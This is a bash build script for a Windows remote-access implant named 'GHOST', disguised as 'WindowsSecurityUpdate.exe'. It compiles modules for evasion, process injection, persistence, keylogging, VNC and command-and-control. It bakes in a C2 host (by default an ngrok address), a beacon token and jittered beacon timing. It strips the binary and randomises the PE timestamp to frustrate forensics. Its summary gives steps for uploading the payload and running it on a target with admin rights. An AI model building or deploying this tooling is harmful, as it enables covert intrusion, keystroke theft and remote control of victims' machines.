#!/usr/bin/env bash
# ─────────────────────────────────────────────────────────────────────────────
#  GHOST build script — cross-compile for Windows x64 via MinGW-w64 on Linux.
#
#  Outputs
#    build/WindowsSecurityUpdate.exe   — stage-2 implant
#
#  Usage
#    ./build.sh                — release (strip, O2, no debug symbols)
#    ./build.sh --debug        — debug symbols, no strip, -DDEBUG
#    ./build.sh --setup        — install MinGW-w64 + optional tools
#    ./build.sh --clean        — remove build/ directory
#
#  One-time setup
#    sudo ./build.sh --setup && chmod +x build.sh
# ─────────────────────────────────────────────────────────────────────────────
set -euo pipefail

# ── Toolchain ─────────────────────────────────────────────────────────────────
CXX="x86_64-w64-mingw32-g++"
WINDRES="x86_64-w64-mingw32-windres"
STRIP_TOOL="x86_64-w64-mingw32-strip"

# ── Final output filename ────────────────────────────────────────────────────
IMPLANT_OUT="WindowsSecurityUpdate.exe"
OUT_DIR="build"

# ─────────────────────────────────────────────────────────────────────────────
#  --setup
# ─────────────────────────────────────────────────────────────────────────────
if [[ "${1:-}" == "--setup" ]]; then
    echo "[*] Installing MinGW-w64 cross-compilation toolchain…"
    if command -v apt-get &>/dev/null; then
        sudo apt-get update -qq
        sudo apt-get install -y mingw-w64 python3
    elif command -v dnf &>/dev/null; then
        sudo dnf install -y mingw64-gcc-c++ python3
    elif command -v pacman &>/dev/null; then
        sudo pacman -S --noconfirm mingw-w64-gcc python3
    else
        echo "[!] Unknown package manager — install mingw-w64 manually."
        exit 1
    fi
    echo "[+] Setup complete. Run './build.sh' to compile."
    exit 0
fi

# ─────────────────────────────────────────────────────────────────────────────
#  --clean
# ─────────────────────────────────────────────────────────────────────────────
if [[ "${1:-}" == "--clean" ]]; then
    rm -rf "$OUT_DIR"
    echo "[+] Cleaned."
    exit 0
fi

# ─────────────────────────────────────────────────────────────────────────────
#  Verify toolchain present
# ─────────────────────────────────────────────────────────────────────────────
if ! command -v "$CXX" &>/dev/null; then
    echo "[!] $CXX not found. Run: sudo ./build.sh --setup"
    exit 1
fi
echo "[*] Toolchain: $($CXX --version | head -1)"

# ─────────────────────────────────────────────────────────────────────────────
#  Parse flags
# ─────────────────────────────────────────────────────────────────────────────
DEBUG=0
for arg in "$@"; do
    case "$arg" in
        --debug) DEBUG=1 ;;
    esac
done

mkdir -p "$OUT_DIR"

# ─────────────────────────────────────────────────────────────────────────────
#  C2 endpoint — asked at build time, baked into the implant (the string is
#  still XOR-obfuscated in the binary by XSW). Env override for scripting:
#    C2_HOST=vps.example.com C2_PORT=443 ./build.sh
# ─────────────────────────────────────────────────────────────────────────────
DEFAULT_HOST="mute-attempt-fossil.ngrok-free.dev"
if [[ -n "${C2_HOST:-}" ]]; then
    C2HOST="$C2_HOST"; C2PORT="${C2_PORT:-443}"
    echo "[*] C2 endpoint (env): $C2HOST:$C2PORT"
else
    read -rp "C2 host (domain or IP) [$DEFAULT_HOST]: " C2HOST || C2HOST=""
    C2HOST=${C2HOST:-$DEFAULT_HOST}
    read -rp "C2 port [443]: " C2PORT || C2PORT=""
    C2PORT=${C2PORT:-443}
fi
[[ "$C2HOST" =~ ^[A-Za-z0-9._-]+$ ]] || { echo "[!] invalid C2 host: $C2HOST"; exit 1; }
[[ "$C2PORT" =~ ^[0-9]+$ && "$C2PORT" -ge 1 && "$C2PORT" -le 65535 ]] || { echo "[!] invalid C2 port: $C2PORT"; exit 1; }

# ── Beacon token (authenticates implant → server; must match the server) ──────
# Env: GHOST_BEACON_TOKEN, or prompted, or a random token is generated and
# printed — start the server with the SAME value (--beacon-token).
BEACON_TOKEN="${GHOST_BEACON_TOKEN:-}"
if [[ -z "$BEACON_TOKEN" ]]; then
    read -rp "Beacon token [enter = generate random]: " BEACON_TOKEN || BEACON_TOKEN=""
    [[ -z "$BEACON_TOKEN" ]] && BEACON_TOKEN=$(python3 -c "import secrets; print(secrets.token_hex(32))")
fi
[[ "$BEACON_TOKEN" =~ ^[A-Za-z0-9_-]{16,128}$ ]] || { echo "[!] invalid beacon token (use 16-128 alnum/-/_ chars)"; exit 1; }

# ── Beacon timing in seconds (env: GHOST_BEACON_MIN / GHOST_BEACON_MAX) ───────
BEACON_MIN="${GHOST_BEACON_MIN:-18}"
BEACON_MAX="${GHOST_BEACON_MAX:-24}"
[[ "$BEACON_MIN" =~ ^[0-9]+$ && "$BEACON_MAX" =~ ^[0-9]+$ && "$BEACON_MIN" -ge 3 && "$BEACON_MIN" -le "$BEACON_MAX" ]] \
    || { echo "[!] invalid beacon timing (need 3 <= MIN <= MAX)"; exit 1; }

# ─────────────────────────────────────────────────────────────────────────────
#  Shared compiler flags
# ─────────────────────────────────────────────────────────────────────────────
COMMON_FLAGS=(
    -std=c++17
    -DUNICODE -D_UNICODE
    -D_WIN32_WINNT=0x0A00
    -DNTDDI_VERSION=0x0A000008
    -mwindows
    -static -static-libgcc -static-libstdc++
    -fno-rtti
    -ffunction-sections
    -fdata-sections
    -fstack-protector-strong
    -mthreads
    -I include
    -Wall -Wextra
    -Wno-unused-parameter
    -Wno-cast-function-type
    -Wno-missing-field-initializers
    -Wl,--gc-sections
    -Wl,--nxcompat
    -Wl,--dynamicbase
    -Wl,--high-entropy-va
)

if [[ $DEBUG -eq 1 ]]; then
    OPT_FLAGS=(-O0 -g3 -DDEBUG -DGHOST_DEBUG)
    DO_STRIP=0
    echo "[*] Mode: DEBUG"
else
    OPT_FLAGS=(-O2 -D_FORTIFY_SOURCE=2)
    DO_STRIP=1
    echo "[*] Mode: RELEASE"
fi

# ─────────────────────────────────────────────────────────────────────────────
#  randomise_pe_timestamp
# ─────────────────────────────────────────────────────────────────────────────
randomise_pe_timestamp() {
    local binary="$1"
    python3 - "$binary" <<'PYEOF' 2>/dev/null || echo "[-] python3 unavailable"
import sys, struct, random
path = sys.argv[1]
with open(path, 'r+b') as f:
    data = bytearray(f.read())
    pe_off = struct.unpack_from('<I', data, 0x3C)[0]
    if data[pe_off:pe_off+4] != b'PE\x00\x00':
        sys.exit(0)
    ts_off = pe_off + 8
    rand_ts = random.randint(1514764800, 1735603200)
    struct.pack_into('<I', data, ts_off, rand_ts)
    f.write(data)
PYEOF
}

# ─────────────────────────────────────────────────────────────────────────────
#  strip_binary
# ─────────────────────────────────────────────────────────────────────────────
strip_binary() {
    local binary="$1"
    "$STRIP_TOOL" \
        --strip-all \
        --remove-section=.comment \
        --remove-section=.note \
        --remove-section=.note.gnu.build-id \
        "$binary"
}

# ─────────────────────────────────────────────────────────────────────────────
#  Build: WindowsSecurityUpdate.exe  (implant)
# ─────────────────────────────────────────────────────────────────────────────
echo ""
echo "[*] Resources: ghost.rc → $OUT_DIR/ghost.res"
"$WINDRES" resources/ghost.rc -O coff -o "$OUT_DIR/ghost.res"

echo "[*] Compiling $IMPLANT_OUT …"
"$CXX" "${COMMON_FLAGS[@]}" "${OPT_FLAGS[@]}" \
    "-DGHOST_C2_HOST=L\"${C2HOST}\"" \
    "-DGHOST_C2_PORT=${C2PORT}" \
    "-DGHOST_BEACON_TOKEN_W=L\"${BEACON_TOKEN}\"" \
    "-DGHOST_BEACON_MIN=${BEACON_MIN}" \
    "-DGHOST_BEACON_MAX=${BEACON_MAX}" \
    src/main.cpp         \
    src/syscalls.cpp     \
    src/evasion.cpp      \
    src/injection.cpp    \
    src/persistence.cpp  \
    src/c2.cpp           \
    src/keylog.cpp       \
    src/vnc.cpp          \
    src/utils.cpp        \
    "$OUT_DIR/ghost.res" \
    -lntdll              \
    -lws2_32             \
    -luser32             \
    -ladvapi32           \
    -lole32              \
    -loleaut32           \
    -lwbemuuid           \
    -lbcrypt             \
    -lcrypt32            \
    -lwinhttp            \
    -ldnsapi             \
    -lshlwapi            \
    -lgdi32              \
    -lgdiplus            \
    -lshell32            \
    -o "$OUT_DIR/$IMPLANT_OUT"

if [[ $DO_STRIP -eq 1 ]]; then
    echo "[*] Stripping $IMPLANT_OUT …"
    strip_binary "$OUT_DIR/$IMPLANT_OUT"
    randomise_pe_timestamp "$OUT_DIR/$IMPLANT_OUT"
fi

SZ_IMPLANT=$(du -sh "$OUT_DIR/$IMPLANT_OUT" | cut -f1)
echo "[+] $IMPLANT_OUT  $SZ_IMPLANT"

# ─────────────────────────────────────────────────────────────────────────────
#  Summary
# ─────────────────────────────────────────────────────────────────────────────
echo ""
echo "╔══════════════════════════════════════════════════════════════════╗"
echo "║  GHOST — BUILD COMPLETE                                          ║"
echo "╠══════════════════════════════════════════════════════════════════╣"
printf "║  %-30s  %s\n" "$IMPLANT_OUT"  "$SZ_IMPLANT  ║"
printf "║  C2 endpoint : %-49s║\n" "$C2HOST:$C2PORT"
echo "╠══════════════════════════════════════════════════════════════════╣"
echo "║  DEPLOYMENT:                                                    ║"
printf "║  1. Upload: python server/c2_cli.py payload upload build/%s\n" "$IMPLANT_OUT"
echo "║  2. Run on target (admin required)                              ║"
echo "╚══════════════════════════════════════════════════════════════════╝"
echo ""